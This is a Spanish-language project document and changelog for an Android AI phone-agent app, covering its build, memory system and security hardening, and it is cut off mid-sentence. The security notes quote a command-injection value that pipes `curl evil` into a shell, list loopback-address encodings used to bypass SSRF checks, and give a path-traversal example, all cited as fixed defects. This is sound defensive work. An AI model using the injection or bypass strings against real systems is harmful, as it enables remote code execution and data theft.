# BlackClaw — Documento vivo del proyecto

> **Propósito**: mapa del proyecto + registro de cambios. Si se pierde el contexto de
> una sesión, este archivo es el punto de partida: dice qué es cada cosa, dónde está,
> qué ya se cambió y qué queda pendiente.
>
> **Regla**: cada modificación se anota en [Registro de cambios](#registro-de-cambios).
> Los pendientes viven en [Pendientes](#pendientes) y se mueven al registro al cerrarse.

Última actualización: 2026-07-28 (memoria + chat con markdown + vídeo de emergencia en
negro; v1.1.6 instalada en el HONOR PTP-N49, v1.1.7 compilada sin instalar; ver registro)

---

## 1. Qué es

Agente de IA on-device que opera un teléfono Android. Un LLM (local o cloud) lee el
accessibility tree, decide y ejecuta acciones (taps, swipes, escritura, navegación).
177 herramientas integradas.

- **Package**: `com.blackclaw.android`
- **Módulo único**: `:app` (sin modularización)
- **minSdk 28 / targetSdk 36 / compileSdk 36**
- **JVM 17**, Kotlin 2.1.21 (declarado en el catálogo)

## 2. Estado actual

| Métrica | Valor |
|---|---|
| Fuente (Kotlin + Java) | 441 archivos / 75.947 líneas |
| Tests unitarios | 66 archivos / **726 tests, 0 fallos** / 7.055 líneas |
| APK release | `v1.2.0`, versionCode **113**, arm64-v8a 125 MB |
| Git | rama `main`, sin commitear |
| Respaldo | rama `backup/pre-modernization` @ `87ef860` + tarball (ver §7) |

Verificado en máquina: `compileDebugKotlin` OK, `testDebugUnitTest` 726/0,
`lintDebug` 0 errores, `assembleRelease` OK. El manifest del APK release se
inspeccionó con `aapt2` para confirmar que **no** contiene la activity de
`ui-test-manifest` (ver §Registro, sesión 2026-07-28).

**El versionCode sigue en 113 a propósito**: coincide con el APK instalado que hay
respaldado, así que reinstalarlo es una vuelta atrás garantizada.

**Nada de este lote está probado en dispositivo.**

## 3. Entorno — leer antes de ejecutar nada

Tres cosas que ya causaron pérdidas de tiempo:

1. **El shell es `fish`, no bash.** Envolver todo en `bash -c '...'` y separar con `;`.
   Los newlines dentro de `bash -c` se colapsan en una línea y rompen el comando.
2. **Kotlin anida comentarios de bloque.** Escribir la secuencia `/` + `*` dentro de un
   KDoc (p.ej. un glob de rutas) abre un comentario que nunca cierra y se traga el
   resto del archivo. Síntoma engañoso: "Unclosed comment" al final de un archivo y
   ~15 errores falsos de "Unresolved reference" en **otro** archivo.
3. **La caché offline está incompleta.** Al quitar `oapi-sdk` cambió la resolución de
   guava; `lintDebug` y `minifyReleaseWithR8` necesitaron una descarga puntual
   (`jsr305`, `guava:31.1-android`). Ya están en caché. Un clon nuevo necesitará red una vez.

### Comandos

```bash
bash -c './gradlew compileDebugKotlin --offline --console=plain 2>&1 | grep -E "^e:|error:|BUILD" | head -30'
bash -c './gradlew testDebugUnitTest --offline --console=plain 2>&1 | grep -E "FAILED|BUILD"'
bash -c './gradlew lintDebug --console=plain 2>&1 | grep -iE "^Wrote|error|BUILD"'
bash -c './gradlew minifyReleaseWithR8 --console=plain 2>&1 | grep -iE "error|BUILD"'
```

Contar tests (no hay `bc` en este sistema, usar `awk`):

```bash
bash -c 'grep -ho "tests=\"[0-9]*\"" app/build/test-results/testDebugUnitTest/*.xml | grep -o "[0-9]*" | awk "{s+=\$1} END {print s}"'
```

### Pantallas que no se pueden verificar con capturas

`ui/settings/EmergencyEvidencePlayerActivity.kt` usa `FLAG_SECURE`, así que
`adb exec-out screencap` devuelve el área de vídeo **en negro aunque funcione**. Esa
pantalla solo se verifica mirando el teléfono. No confundirlo con el defecto de v1.1.7.

### Conectar el teléfono (ADB inalámbrico)

**El `adb` de este sistema no tiene mDNS** (`adb mdns check` → `unknown host service`), así
que no descubre el dispositivo solo y el puerto de depuración inalámbrica es aleatorio. Hay
que sacar IP y puerto con avahi:

```bash
bash -c 'timeout 10 avahi-browse -rtp _adb-tls-connect._tcp'   # IP:puerto para conectar
bash -c 'timeout 10 avahi-browse -rtp _adb-tls-pairing._tcp'   # si sale algo, falta emparejar
bash -c 'adb connect <IP>:<PUERTO>; adb devices -l'
```

Instalar un release firmado (la clave ya está en `signing/`, no hay que copiar nada):

```bash
bash -c 'BLACKCLAW_VERSION_NAME=<ver> ./gradlew assembleRelease --console=plain 2>&1 | grep -iE "error|FAILED|BUILD|output file name"'
bash -c 'adb install -r app/build/outputs/apk/release/BlackClaw_v<ver>_arm64-v8a_<fecha>.apk'
```

Comprobar que fue actualización en sitio y no instalación limpia (`firstInstallTime` no debe
cambiar) y que no hay crashes:

```bash
bash -c 'adb shell dumpsys package com.blackclaw.android | grep -E "versionName|versionCode=|firstInstallTime|lastUpdateTime"'
bash -c 'adb logcat -d -b crash | grep -i blackclaw'
```

`apksigner`/`aapt2` no están en el PATH; viven en `/opt/android-sdk/build-tools/36.0.0/`.
`MemoryPrivacyActivity` y el resto de Activities son `exported="false"`, así que **no** se
pueden lanzar con `am start` desde adb: hay que navegar la UI con el teléfono desbloqueado.

## 4. Arquitectura

### Pipeline de 3 niveles

Toda petición entra por `TaskOrchestrator.startNewTask`:

1. **Tier 1 — determinístico** (`agent/PipelineRouter.kt`): regex → deep link o tool
   directa. 0 llamadas al LLM.
2. **Tier 2 — skill** (`agent/skill/`): skills con patrones de disparo. Si falla, cae al 3.
3. **Tier 3 — agent loop** (`agent/DefaultAgentService.kt`): percepción → razonamiento
   → acción. `runAgentLoop` son 477 líneas, la función más grande del proyecto.

### Rutas clave

| Qué | Dónde |
|---|---|
| Entrada de la app | `ClawApplication.kt` |
| Estado global | `AppViewModel.kt` |
| Orquestador de tareas | `TaskOrchestrator.kt` |
| Agent loop | `agent/DefaultAgentService.kt` |
| Registro de tools (+ gate de riesgo) | `tool/ToolRegistry.kt` |
| Base de las tools | `tool/BaseTool.kt` |
| Servicio de accesibilidad | `service/ClawAccessibilityService.java` (38 archivos lo referencian) |
| Sistema de diseño | `ui/design/` |
| Config del build | `app/build.gradle.kts`, `gradle/libs.versions.toml` |

### Paquetes (28)

`adb` `agent` `assistant` `automation` `autoreply` `base` `car` `channel` `conversation`
`debug` `emergency` `floating` `game` `knowledge` `memory` `perception` `proactive`
`scheduler` `security` `server` `service` `shizuku` `support` `terminal` `tool` `ui` `utils` `widget`

Subpaquetes de `ui`: `adb assist assistant autoreply chat dashboard design guide
onboarding proactive scheduled security settings shizuku skills splash terminal tools web`

## 5. Sistema de memoria

Es el subsistema en el que estamos trabajando. Dos capas distintas:

### Capa 1 — timeline reciente compartido

`conversation/ConversationRepository.kt` — una sola clave MMKV
(`conversation_engine_turns_v2`), tope 240 turnos.

Todas las superficies **locales** escriben en el mismo hilo (`"local"`, `Trust.LOCAL`)
y todas leen con `recentLocalLines()`:

| Superficie | Escribe desde |
|---|---|
| `CHAT` | `ui/chat/ChatSessionController.kt`, `ui/chat/TaskFlowController.kt` |
| `QUICK_ASSIST` | `ui/assist/QuickAssistActivity.kt` |
| `VOICE` | `service/VoiceWakeService.kt` |
| `ANDROID_AUTO` | `car/CarTaskScreen.kt` |
| `AUTOMATION` | `automation/AutomationEngine.kt` |

Los canales remotos (Telegram/Discord/WeChat) usan `appendRemote` en hilos separados
(`remote:IDENTITY`, `Trust.REMOTE_ISOLATED`) y **están aislados**: `recentLocalLines`
filtra por `Trust.LOCAL`. Flag opt-in `remoteBridgeEnabled` (default `false`).

### Capa 2 — memoria de largo plazo

`memory/MemoryHub.kt` ensambla por prioridad bajo presupuesto de caracteres
(`DEFAULT_BUDGET_CHARS = 2400`, `LOCAL_BUDGET_CHARS = 1400`):

| Prio | Sección | Archivo |
|---|---|---|
| 1 | Perfil aprendido | `memory/UserProfile.kt` |
| 2 | Hechos explícitos | `memory/UserMemoryStore.kt` |
| 3 | Rutinas | `assistant/RoutineEngine.kt` |
| 4 | Historial de tareas | `agent/TaskHistoryStore.kt` |
| 5 | Resúmenes de conversaciones | `memory/ConversationMemory.kt` |

`packByPriority` (interno, puro, testeado) hace el empaquetado: **para en la primera
sección que no cabe** y **nunca trunca a media frase**. Por eso la sección 1 tiene tope
propio (`UserProfile.MAX_SNIPPET_CHARS = 600`): sin él, un perfil grande se llevaba consigo
toda la memoria.

Consumidores: `agent/DefaultAgentService.kt` (agent loop) y — desde esta sesión —
`ui/chat/ChatSessionController.sharedContextSuffix()` (chat conversacional).

Los cinco stores comparten ahora la base `memory/JsonListStore.kt` (leer/añadir/upsert/
borrar + capping por recencia). `memory/MemoryInventory.kt` es la vista de solo-privacidad
sobre las cuatro categorías persistidas, y la única puerta que usa
`ui/settings/MemoryPrivacyActivity.kt` para mostrar y borrar.

**El asistente proactivo NO recibe `MemoryHub`.** Tiene su propio
`proactive/ProactiveMemory.kt` que nadie más lee. Sí lee un trozo del timeline
compartido (`recentLocalLines(4, 500)`) y sí escribe en el perfil global vía
`UserProfile.learnFromInteractions()`. Decisión deliberada: meter el perfil completo en
cada clasificación de notificación infla un prompt que corre constantemente y mezcla
datos personales con texto no confiable.

## 6. Modelo de seguridad (añadido esta sesión)

### Capas de decisión, todas puras y testeadas

| Archivo | Decide |
|---|---|
| `channel/auth/ChannelAuthPolicy.kt` | Si un mensaje remoto puede mover al agente |
| `server/ConfigServerPolicy.kt` | Auth del servidor local, URLs seguras, contención de rutas |
| `tool/guard/ToolRiskPolicy.kt` | Qué tool puede correr según procedencia |
| `automation/AutomationCallerPolicy.kt` | Qué app puede disparar automatización |
| `tool/impl/SshHostKeyPolicy.kt` | Pinning de host key SSH |
| `tool/impl/SmartHomeWebhookPolicy.kt` | Validación de webhooks (SSRF) |
| `security/SecurityPolicy.kt` | Nombres de paquete y apps protegidas |

### Reglas que hay que respetar al tocar código

- **`ToolRiskPolicy`**: las tools de comando arbitrario (`shell_exec`, `local_terminal`,
  `remote_shell`, `remote_connect`, `add_smart_device`) están **denegadas siempre** para
  origen `REMOTE`/`UNKNOWN`/`AUTOMATION`, y en `LOCAL` requieren
  `PrivilegedToolConsent.isArmed()`. `fast_tap`/`fast_swipe`/`game_*` son SAFE **a
  propósito**: usan shell pero todos sus valores pasan por `requireInt`.
- **El gate vive en `ToolRegistry.executeTool`**, no en el agent loop. Cualquier caller
  nuevo lo hereda automáticamente. No lo muevas.
- **`ToolExecutionContext`** es un `@Volatile`, no un `ThreadLocal`: las tools corren en
  el pool `tool-exec`, así que un ThreadLocal no propagaría. Falla cerrado a `UNKNOWN`.
- **El gate de canales corre en cada handler ANTES de mutar el destino de respuesta**
  (`lastChatId`/`lastChannelId`/`lastFromUserId`). Si se mueve a `ChannelSetup`, un
  desconocido rechazado puede secuestrar a dónde va la siguiente respuesta del agente.
- **`ConfigServerManager.getAddress()` anuncia una IP LAN pero el servidor bindea
  `127.0.0.1`.** Bug preexistente, **no arreglado**. NO lo "arregles" bindeando `0.0.0.0`.

### Secretos que el usuario debe poder ver (4 pantallas)

| Secreto | API | Dónde se muestra |
|---|---|---|
| Código de vinculación de canal | `ChannelAuthorization.pairingCodeForDisplay(channel)` | `ui/settings/ChannelConfigScreen.kt` |
| Código de acceso LAN | `ConfigServerManager.accessCodeForDisplay()` | idem (`LanConfigCard`) |
| Consentimiento de shell | `PrivilegedToolConsent.arm()/disarm()` | `ui/adb/PrivilegedToolsCard.kt` |
| Token de automatización | `AutomationToken.tokenForDisplay()` | idem (`AutomationTokenCard`) |

Componente compartido: `ui/design/ClawSecretCard.kt`. La fuente monoespaciada **no es
decoración**: es lo que permite distinguir `0`/`O` al reescribir el código en un chat.

## 7. Respaldos

1. **Tarball**: `/home/angel/Descargas/blackclaw/BlackClaw_BACKUP_20260727_183037.tar.gz`
   — 85 MB, 1568 archivos, integridad gzip verificada.
2. **Rama git**: `backup/pre-modernization` @ `87ef860` (661 archivos trackeados).
   Creada con `commit-tree` sobre un índice temporal, así que el working tree, HEAD y el
   índice real nunca se tocaron.

Copias puntuales pre-borrado: `/tmp/assist_backup.kt`, `/tmp/chancfg_backup.kt`.

## 8. Sistema de diseño

`ui/design/` — 6 archivos:

- `ClawMotion.kt` — duraciones (90/180/260/420/620), easings, springs,
  `staggerDelay(index, step=45, max=320)` con tope para que el ítem 30 no espere 1,5 s.
- `ClawPalette.kt` — `ClawAccent` (base/light/deep/**onAccent**) × 10 accents semánticos.
  `onAccent` es por accent, **no siempre blanco**: ámbar/teal/lima fallan contraste con
  texto blanco. `Elevation` da profundidad por **tinte**, no por sombra (invisible sobre
  negro).
- `ClawFeedback.kt` — press scale 0.965, `reduceMotion()`, hápticas por `View`.
- `ClawButtons.kt` — primario/secundario/chip, targets ≥48 dp.
- `ClawCards.kt` — `ClawReveal` (posee su propio `remember`, así el caller no puede
  causar los bugs típicos de re-animar al scrollear o al borrar), `ClawCard`,
  `ClawHeroCard`, `ClawShimmer`.
- `ClawSecretCard.kt` — tarjeta de secreto + `ClawIconAction` + `ClawTextColors`.

---

## Registro de cambios

### Sesión 2026-07-28

Un solo lote, un solo build. Objetivo: que el asistente del botón de power muestre
resultados de verdad —clima, mapas, ofertas con precio y enlace— en vez de párrafos.

#### Tarjetas ricas en el asistente: el dato llega hasta la UI

El panel ya tenía "tarjetas", pero se decidían **matcheando subcadenas en la prosa del
modelo** (`detectCardType` buscaba "clima", "soleado", "humedad" y exigía un "°") y solo
dibujaban un emoji junto al mismo texto crudo. No tenían campos, así que no podían ser
interactivas. El dato real se destruía dos veces antes de llegar a la pantalla: dentro de
cada tool, que formateaba sus números en una frase en español, y otra vez en
`TaskOrchestrator`, que recorta el resultado a 300 caracteres para una línea de progreso.

Se descartaron dos alternativas: seguir parseando la prosa (no da campos ni
interactividad) y pedirle al modelo que emitiera JSON (los modelos gratuitos no cumplen
de forma fiable). Lo que se hizo es llevar el dato estructurado hasta la UI.

- `cards/AssistCard.kt`, `AssistCardCodec.kt`, `MapTiles.kt`, `PriceText.kt` — **nuevos**,
  puros, sin Android ni Compose. `sealed interface AssistCard` con Weather, Place, Offer y
  Link: solo variantes que algún tool puede producir con datos que ya tiene. +63 tests.
  - `decode()` **nunca lanza**: una entrada mala se salta sola sin arrastrar a las buenas.
    Una tarjeta es una mejora de presentación sobre una respuesta que el usuario ya recibe
    como texto; tirar el panel por un adorno sería un mal cambio.
  - `Offer` sin precio **degrada a `Link`** en vez de desaparecer. `Weather` sin sitio o
    con temperatura no finita se descarta, para no pintar "NaN°".
  - Gson y no `org.json` en el codec: `org.json` en tests JVM es un stub que devuelve
    valores por defecto y haría pasar tests que no comprueban nada.
  - `PriceText` devuelve la subcadena **verbatim** y exige un marcador de moneda pegado al
    número. Reformatear "1.299,00 €" sin conocer la convención lo convierte en "1,30 €", y
    un precio inventado es peor que ningún precio.
- `ui/cards/MapTiles`+`MiniMap.kt`+`TileImageLoader.kt` — **nuevos**. Mini mapa con una
  **tesela real de OpenStreetMap**, matemática Web Mercator propia y pin colocado con el
  offset dentro de la tesela (usar el centro se equivoca por un par de calles al zoom 15).
  Se descartó un SDK de mapas (no hay ninguno y la app es Play-Services-free) y también
  dibujar un mapa estilizado en Canvas: un marcador sobre una rejilla inventada parece
  cartografía sin serlo. Sin red muestra las coordenadas y lo dice, en vez de dejar un
  rectángulo gris que se lee como app rota. La atribución "© OpenStreetMap" se dibuja
  **dentro** del composable porque es condición de la licencia, no decoración.
- `ui/cards/AssistCardViews.kt` — **nuevo**. Las cuatro tarjetas, con entrada escalonada
  y la temperatura contando hacia arriba. El icono del clima se elige desde el **código
  WMO**, nunca matcheando las palabras: el tool ya es el dueño de esa tabla y una segunda
  interpretación divergiría. La tarjeta de clima **no** es clicable entera; solo tiene una
  fila "ver en el mapa", porque una tarjeta que navega al tocarla en cualquier punto es
  una tarjeta que el usuario deja de tocar.
- `ui/cards/AssistCardSkin.kt` — **nuevo**. El skin se pasa como parámetro: el panel del
  power tiene identidad violeta propia y el chat va por los diez temas del usuario, así
  que una tarjeta que tirase de `ClawPalette` se vería pegada de otra app en el panel.
- `tool/ToolResult.kt` — gana `@Transient val cards: String?` y un tercer factory. El
  `@Transient` es lo importante: el bucle del agente serializa este objeto con Gson y lo
  manda al modelo, así que un campo normal duplicaría cada valor —prosa y JSON— y el
  usuario pagaría los tokens. Al ser parámetro con valor por defecto, los ~600 sitios que
  ya llamaban a `success`/`error`, incluidos los de Java, siguen compilando.
- `TaskEvent.kt` — nuevo `ToolCards(payload)`, **separado** de `ToolResult`, que es una
  línea de estado recortada a 300 caracteres: correcto para una fila de progreso y fatal
  para un payload, que se cortaría a mitad de JSON y decodificaría a nada.
- `WeatherTool.kt` — **reestructurado**: nueva `Reading` con los valores, y la frase en
  español ahora se **deriva** de ella en vez de ser el único sitio donde los números
  existen. `WebAnswerTool.kt` convierte cada resultado en Offer o Link buscando el precio
  primero en el título (los comercios ponen ahí el precio del producto y en el snippet
  citan otro distinto). `GetLocationTool.kt` acompaña su frase con un `Place`.
- `ui/chat/*` — el chat también las dibuja. `ChatMessage.Role` gana `CARDS`; el compilador
  señaló los cuatro `when` exhaustivos que había que atender. Las tarjetas **no se
  persisten** en el historial: una tarjeta es una vista viva de un resultado, y guardarla
  haría que al reabrir la conversación el clima de ayer apareciera como el actual.

#### Tablas en markdown (+29 tests)

`ChatMarkdown.kt` gana `Block.Table` con alineación por columna. Una tabla se reconoce
solo cuando llega su línea separadora: mientras la cabecera está sola se dibuja como
párrafo y luego se reordena una vez. Ese reflow se acepta a propósito, porque la
alternativa —tratar cualquier línea con un pipe como fila— convertiría frases normales en
tablas de una celda, que es estar mal siempre en lugar de estar mal un instante.

Un test encontró un **bug real**: al llegar al tope de filas se hacía `break`, dejando el
resto de líneas sin consumir, así que una tabla larga terminaba seguida de cientos de
párrafos llenos de pipes. Ahora sigue consumiendo y solo deja de coleccionar.

Las tablas hacen scroll horizontal con un ancho mínimo por celda, no reparto por peso:
con dos columnas el reparto se ve bien y con seis produce tiras ilegibles. Es la misma
decisión que ya estaba tomada para los bloques de código, así que las dos cosas anchas de
un mensaje se comportan igual.

#### Monitor y Enviar mensaje: dos funciones acabadas que nadie podía abrir

`MonitorDialog` y `SendMessageDialog` estaban completos y conectados en la Activity, pero
sus flags `show…` **nunca se ponían en true desde ningún sitio**. El botón de adjuntar del
composer pasa a ser un menú "+" con tres entradas. Menú y no más botones: la fila ya tenía
tres controles que estrechaban el campo de texto, y "vigilar un chat" no es un icono.

#### Stores: migración parcial y deliberada

La premisa "migrar los tres stores a `JsonListStore`" resultó ser **parcialmente
equivocada** al inspeccionarlos, y forzarla habría borrado datos de usuarios existentes.

- `RoutineEngine.kt` — migrado; encaje exacto. Arregla tres cosas por el camino: un fsync
  en cada create/update/delete (incluido el que solo incrementa `runCount`), una rutina
  que fallara al parsear y desaparecía sin traza, y un tope que borraba `removeAt(0)` —la
  primera almacenada, que tras cualquier update **no** es la más antigua.
- `TaskHistoryStore.kt` — migrado. Guarda del más antiguo al más nuevo, que es la
  convención de la base y lo que hace funcionar su tope por recencia, mientras su API
  pública sigue devolviendo del más nuevo al más viejo; los dos órdenes se invierten
  exactamente en esa frontera en vez de dejar que cada llamante adivine.
- `ProactiveMemory.kt` — solo la lista que **es** una lista de registros. Los dos
  contadores por hora pasan a una clase `RollingWindow` propia: parecen la misma forma y
  no lo son, y meterlos en `JsonListStore` reescribiría `[1770000000000, …]` como
  `[{"t":…}, …]`, con lo que el array viejo dejaría de parsear y **el límite de acciones
  se resetearía a todos los usuarios**. Las preferencias aprendidas y los dos mapas se
  quedan como están por la misma razón, documentada en el propio archivo.

#### Tests de layout (+10 tests) — la infraestructura que faltaba

Tres bugs de layout llegaron al teléfono en sesiones anteriores y ninguno era de los que
un test de lógica pura puede ver: son fallos de **medida**, y medir requiere un layout
real. Se añadieron Robolectric 4.16.1 y `compose ui-test`, y dos archivos de test que
miden a 411 dp de ancho (a ancho de tablet los tres bugs se esconden).

Tres obstáculos reales, cada uno bloqueante:

1. Robolectric 4.14 se quedó **25 minutos** sin descargar nada: mapea cada nivel de SDK a
   un runtime preconstruido y para API 36 no tiene ninguno, así que buscaba un artefacto
   inexistente sin dar un mensaje claro.
2. `UnsatisfiedLinkError: no conscrypt_jni`. La app trae `conscrypt-android` a propósito y
   Robolectric trae la misma librería compilada para host; ambas caían en el classpath de
   test y ganaba la de Android, que busca una `.so` que solo existe en un móvil. Se
   excluye la variante Android **solo** del classpath de tests.
3. `UnsatisfiedLinkError: no mmkv`. Robolectric arrancaba `ClawApplication`, que inicializa
   MMKV. Los tests usan la `Application` estándar: medir un composable no requiere
   arrancar el almacenamiento ni el registro de modelos de la app.

El SDK se fija en el `@Config` en lugar de heredarse de `targetSdk`, para que un bump
rutinario del target no convierta esto en "los tests de layout ya no corren".

Uno de los tests que escribí **falló y estaba mal**: pretendía reproducir la disposición
que causó el bug del título machacado, pero le había dejado el `weight` al título, así que
no reproducía nada. Se reescribió como la forma general del fallo y se renombró, en vez de
reconstruir de memoria el código exacto: un test que codifica una suposición como si fuera
un hecho es peor que no tener test.

`AssistCardLayoutTest` mide las tarjetas nuevas con los casos que rompen anchos: topónimo
administrativo largo, precio de seis cifras, dominio largo y una URL sin espacios. El mini
mapa **no** se ejercita ahí a propósito: dependería de que OpenStreetMap responda, y un
test de layout que falla por la red no es un test de layout.

#### Verificación

`compileDebugKotlin` OK · `testDebugUnitTest` **726/0** · `lintDebug` 0 errores ·
`assembleRelease` OK (v1.2.0, versionCode 113). El manifest del APK release se inspeccionó
con `aapt2` para confirmar que la activity de `ui-test-manifest` **no** está: se declaró
como `debugImplementation` justo para eso, y era la clase de detalle que conviene
comprobar en lugar de suponer.

**Nada de este lote se probó en dispositivo**: el teléfono no estaba accesible por ADB.
Queda sin verificar en pantalla todo lo visual —tarjetas, mini mapa, tablas, menú "+"— y
el mini mapa además necesita red para tener algo que mostrar.

### Sesión 2026-07-27

#### Modo emergencia — grabación (6 defectos)

Síntoma: vídeos oscuros y "no graba nada".

- `emergency/EmergencyCameraController.kt` — **reescrito**. Causa raíz de la oscuridad:
  `CONTROL_AE_TARGET_FPS_RANGE` nunca se seteaba, así que el HAL elegía p.ej. `[30,30]`
  que **prohíbe exposiciones > 1/30 s**. Ahora elige el rango con el límite inferior más
  bajo. Segunda causa: `recorder.start()` corría en el mismo tick que
  `setRepeatingRequest`, sin frames para medir; ahora espera convergencia de AE (techo
  1,5 s + fallback garantizado). 3A explícito (`AE/AWB/AF`) porque varios HALs OEM no
  aplican los defaults de `TEMPLATE_RECORD` sin preview.
  Causa de "no graba": `MediaRecorder.stop()` lanza si no pudo cerrar el `moov`, el
  `runCatching` se lo tragaba y **se borraba el archivo**. Ahora conserva cualquier
  archivo con bytes y distingue `partial`/`never_started`/`empty` con la excepción real.
  Además: `stopSlots()` fuera del main thread, orientación de cámara frontal corregida
  (sumaba en vez de restar), fallback de resolución al más pequeño (no al primero de una
  lista descendente), listeners de error del encoder.
- `emergency/EmergencyCameraTuning.kt` — **nuevo**. Lógica pura extraída porque
  `android.util.Size`/`Range` son stubs en tests JVM y devolverían 0. +21 tests.
- `emergency/EmergencyConfig.kt` — `lowLightTorch` (off por defecto, nunca en modo discreto).
- `emergency/EmergencyService.kt`, `ui/settings/EmergencySettingsActivity.kt` — wiring del toggle.

#### Seguridad

- `channel/auth/ChannelAuthPolicy.kt` + `ChannelAuthorization.kt` — **nuevos**.
  Vinculación por código (8 chars, alfabeto sin ambigüedades, un solo uso, bloqueo tras
  5 fallos/10 min). Antes **cualquier desconocido que encontrara el bot controlaba el
  teléfono**. +24 tests.
- `channel/{telegram,discord,wechat}/*Handler.kt` — gate conectado **antes** de mutar el
  destino de respuesta. También se quitó el texto del mensaje de 3 líneas de log.
- `server/ConfigServerPolicy.kt` — **nuevo**, +29 tests. `ConfigServer.kt`: token
  obligatorio en `/api` (comparación en tiempo constante + throttling 10/5 min → 429),
  secretos enmascarados (el `maskSecret` que llevaba ahí muerto), **eliminado
  `Access-Control-Allow-Origin: *`**, validación de `llmBaseUrl`, contención de rutas
  canónica (antes `<cache>/../files/mmkv` pasaba y filtraba el key store).
- `tool/guard/{ToolRiskPolicy,PrivilegedToolConsent,ToolExecutionContext}.kt` —
  **nuevos**, +15 tests. Gate movido a `ToolRegistry.executeTool` (antes
  `ExecutePlanTool`/`DebugTaskReceiver`/endpoint de debug lo saltaban).
- `tool/impl/ForceStopAppTool.kt` — validación con `SecurityPolicy.isValidPackageName`.
  Mataba la inyección `package="x; curl evil|sh"`.
- `automation/AutomationToken.kt` + `AutomationCallerPolicy.kt` — **nuevos**, +18 tests.
- `tool/impl/SshHostKeyPolicy.kt` — **nuevo**, +15 tests. Pinning real vía
  `HostKeyRepository`: un cambio de clave **aborta antes de enviar la contraseña**.
- `tool/impl/SmartHomeWebhookPolicy.kt` — **nuevo**, +23 tests. Valida con el `HttpUrl`
  de OkHttp (el mismo parser que construye la petición) + `inet_aton` a mano, así
  `2130706433`/`0x7f000001`/`127.1` también se detectan.
- `res/xml/network_security_config.xml` — cleartext `false` + loopback.
- `car/BlackClawCarAppService.kt` — `HostValidator` real en release.
- `AndroidManifest.xml` — permiso `signature` en el receiver de automatización.

#### Fugas y concurrencia

- `service/ClawAccessibilityService.java` — `SCREENSHOT_EXECUTOR` estático daemon
  (antes: **un thread filtrado por screenshot**, no-daemon, para siempre).
- `perception/ScreenCaptureService.kt` — ~20 MB de bitmaps por captura (intermedio con
  padding + frame anterior). `cachedBitmap()` nunca devuelve uno reciclado.
- `perception/ImageOcr.kt` — reciclado en `try/finally`.
- `floating/FloatingCircleManager.kt` — `show()`/`ensureShowing()` al main thread.
- `agent/DefaultAgentService.kt` — `submit` protegido (antes un `RejectedExecutionException`
  dejaba `running=true` **para siempre**), `continue`→`return` tras `onComplete`,
  `lateinit`→`@Volatile`.
- `AppViewModel.kt` + `TaskOrchestrator.kt` — wake lock emparejado al ciclo de tarea
  (antes se tomaba 10 min en cada arranque y `releaseScreenWakeLock` no tenía callers).
- `utils/ProcessUtils.java` — **nuevo**. Drena+cierra+destruye; aplicado en 6 sitios.
- `utils/AppUpdater.kt`, `game/GameAutoclickerOverlay.kt`, `service/AutoReplyManager.java`.

#### Observabilidad y build

- `ClawApplication.kt` — `.onFailure` en los 9 `runCatching` silenciosos; niveles de log
  corregidos.
- `gradle/libs.versions.toml` + `app/build.gradle.kts` — Kotlin en el catálogo,
  **7 dependencias sin usar eliminadas** (`oapi-sdk`, `dingtalk`, retrofit ×2, `ok2curl`,
  `multitype`, `glide-transformations`), lifecycle reconciliado, 14 deps inline movidas
  al catálogo, `getVersionGit` tolerante a fallos.
- `app/proguard-rules.pro` — los 3 `-keep ... { *; }` que cubrían `agent`/`tool`/`channel`
  (el núcleo entero) reducidos a lo justificado por reflexión de Gson.
  **Cambiado, NO verificado en dispositivo.**

#### Visual

- `ui/design/` — 6 archivos nuevos (§8).
- `ui/assistant/AssistantCardModel.kt` + `AssistantSummary.kt` — **nuevos**, puros, +42 tests.
- `ui/assistant/AssistantItemCard.kt` + `AssistantHero.kt` — **nuevos**. El pulso de
  "vencido" va en el **borde**, nunca en el texto (el contraste no debe cambiar mientras
  lees), y "Vencido" se dice **en palabras**, no solo en rojo.
- `ui/assistant/AssistantActivity.kt` — reconectado; borrados `HeroHeader` e `ItemCard`.
- `ui/settings/ChannelConfigScreen.kt` — **nuevo** (Compose). `ChannelConfigActivity.kt`
  reescrito manteniendo el `ActivityResultContract` intacto.
- `ui/adb/PrivilegedToolsCard.kt` — **nuevo**.

#### Memoria — asimetría chat/agente

- `ui/chat/ChatSessionController.kt` — nuevo `sharedContextSuffix(isLocal)`. Antes
  `MemoryHub` se ensamblaba **solo** en `DefaultAgentService`, así que una respuesta
  conversacional corría sin perfil ni hechos guardados: el asistente podía guardar
  "mi mamá se llama Ana" y no usarlo dos turnos después solo porque el segundo mensaje no
  necesitaba una tool. De paso eliminada la duplicación entre las rutas local y cloud.
- `memory/MemoryHub.kt` — extraído `packByPriority` (puro) + `MemoryHubTest` (11 tests).

#### Memoria — los 9 defectos de la auditoría (cerrados)

Verificado al terminar: `compileDebugKotlin`, `testDebugUnitTest --rerun-tasks`
(**553 tests, 0 fallos, 0 errores**; 491 antes → +62), `lintDebug`, `minifyReleaseWithR8`,
todos OK. Sigue sin probarse en dispositivo.

**#1 — Tope al snippet de perfil.** `memory/UserProfile.kt`: nueva const
`MAX_SNIPPET_CHARS = 600`. `asPromptSnippet` partido en `asPromptSnippetOf(profile, budget)`
(puro) → `renderSnippet(snippetLines(p), budget)`. `snippetLines` devuelve las líneas
**ordenadas de más a menos valiosa**, con `traits` al final porque es el único campo sin
cota. `renderSnippet` descarta líneas enteras desde el final y devuelve `""` si no cabe
nada — nunca una cabecera sola.
*Por qué 600 y no truncar a media frase*: `MemoryHub` descarta secciones **completas**, no
recorta; un perfil grande en prioridad 1 borraba toda la memoria, incluida sí misma. Y
cortar a media frase invita al modelo a inventar la mitad que falta. 600 deja aire dentro
del presupuesto local de 1400.

**#3 — Carrera de actualización perdida + fsync por mensaje.** `recordInteraction` ahora es
`@Synchronized` sobre **todo** el read-modify-write (antes solo lo era `interactions()`, así
que dos hilos leían la misma lista, ambos añadían y un añadido se perdía). Añadido buffer
`pending` + `WRITE_THROTTLE_MS = 30_000` + `flushPending()` + `flush()` público, llamado al
inicio de `learnFromInteractions()`. **`KVUtils.sync()` eliminado** de esta ruta.
*Por qué*: MMKV escribe sobre una región mmap, así que las entradas ya sobreviven a la
muerte del proceso; `sync()` solo añade durabilidad ante un corte de luz y era la parte
caro. `interactions()` devuelve almacenadas + pendientes, así que un lector nunca ve una
vista vieja. Nada se descarta: se cambia frecuencia de escritura, no datos.

**#5 — Los hechos se ordenaban por posición.** `memory/UserMemoryStore.kt`: nuevos
`capByRecency(facts, max)` y `mostRecent(facts, max)` (puros). `saveAll` y `asPromptSnippet`
seleccionan por `addedAtMs`, no por índice.
*Por qué importaba*: `remember()` reemplaza en el sitio original y refresca `addedAtMs`, así
